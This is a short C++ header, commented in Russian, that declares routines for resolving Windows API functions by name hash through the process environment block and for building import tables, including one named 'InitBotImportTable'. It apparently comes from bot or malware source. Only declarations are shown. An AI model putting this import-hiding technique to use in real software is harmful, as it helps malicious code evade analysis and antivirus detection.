#pragma once

#include <winsock2.h>
#include <Windows.h>
#include "ntdll.h"
#include "type.h"
#include "api_funcs_hash.h"
#include "api_funcs_type.h"
#include "winapi_simple.h"

//для хеша имена длл должны быть в верхнем регистре
const uint hashKernel32 = 0x0b9f5b9c; //KERNEL32.DLL
//хеши WINAPI функций
//const uint hashGetProcAddress = 0x0b3c1d03;
//const uint hashLoadLibraryA = 0x0aadf0f1;

//typedef PVOID (WINAPI* typeGetProcAddress)( HMODULE, LPCSTR );
//typedef HMODULE (WINAPI* typeLoadLibraryA)( LPCTSTR ) ;

#ifdef __cplusplus

namespace WinAPI
{

//инициализация хеш таблицы апи функций
bool Init();
PPEB GetPEB();
//возвращает ImageBase длл по хешу ее имени, результат будет только для длл котрые подгружены в процесс
HMODULE GetDllBase( uint dllHash );
//возвращает адрес экспортной функции по ее хешу
void* GetApiAddr( HMODULE module, DWORD hashFunc );
bool BuildImportTable( HMODULE imageBase, typeLoadLibraryA _LoadLibraryA, typeGetProcAddress _GetProcAddress );
bool InitBotImportTable();
//возвращает указатель на адрес импотируемой функции
DWORD* GetImportAddr( HMODULE imageBase, uint hashFunc, IMAGE_OPTIONAL_HEADER *poh = 0 );

}

#endif
